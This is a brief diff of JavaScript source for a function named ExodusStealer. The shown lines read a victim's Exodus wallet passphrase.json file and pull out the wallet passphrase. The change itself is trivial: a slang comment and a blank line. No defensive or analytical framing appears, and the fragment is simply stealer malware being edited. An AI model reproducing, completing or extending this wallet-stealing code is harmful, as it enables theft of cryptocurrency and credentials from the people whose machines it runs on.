@@ -120,7 +120,7 @@ async function ExodusStealer(passwords) {
     if (!exodusInfo.passwordRequired) {
         const passphrasePath = path.join(exodusInfo.walletDir, "passphrase.json");
         try {
-            const passphraseJson = fs.readFileSync(passphrasePath, "utf8");
+            const passphraseJson = fs.readFileSync(passphrasePath, "utf8"); // ts gotta be utf8 
             const passphraseData = JSON.parse(passphraseJson);
             const passphrase = passphraseData.passphrase;
 
@@ -207,4 +207,5 @@ async function ExodusStealer(passwords) {
         console.error("----------------------");
     }
 })();
+
 
